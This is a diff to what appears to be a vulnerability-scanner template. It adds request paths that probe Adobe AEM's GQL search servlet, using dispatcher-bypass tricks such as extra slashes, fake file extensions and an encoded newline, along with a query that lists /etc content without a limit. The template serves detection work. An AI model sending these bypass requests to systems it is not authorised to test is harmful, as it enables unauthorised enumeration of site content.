@@ -21,6 +21,15 @@ requests:
       - '{{BaseURL}}///bin///wcm/search/gql.json/a.ico'
       - '{{BaseURL}}///bin///wcm/search/gql.json/a.png'
       - '{{BaseURL}}///bin///wcm/search/gql.json/a.html'
+      - '{{BaseURL}}/bin/wcm/search/gql.servlet.json?path:/etc%20type:base%20limit:..-1&pathPrefix='
+      - '{{BaseURL}}///bin///wcm/search/gql.servlet.json?path:/etc%20type:base%20limit:..-1&pathPrefix='
+      - '{{BaseURL}}/bin/wcm/search/gql.json?path:/etc%20type:base%20limit:..-1&pathPrefix='
+      - '{{BaseURL}}/bin/wcm/search/gql.json/a.css?path:/etc%20type:base%20limit:..-1&pathPrefix='
+      - '{{BaseURL}}/bin/wcm/search/gql.json/a.html?path:/etc%20type:base%20limit:..-1&pathPrefix='
+      - '{{BaseURL}}/bin/wcm/search/gql.json/a.png?path:/etc%20type:base%20limit:..-1&pathPrefix='
+      - '{{BaseURL}}/bin/wcm/search/gql.json/a.ico?path:/etc%20type:base%20limit:..-1&pathPrefix='
+      - '{{BaseURL}}/bin/wcm/search/gql.json/a.1.json?path:/etc%20type:base%20limit:..-1&pathPrefix='
+      - '{{BaseURL}}/bin/wcm/search/gql.json;%0aa.css?path:/etc%20type:base%20limit:..-1&pathPrefix='
     matchers-condition: and
     matchers:
       - type: status
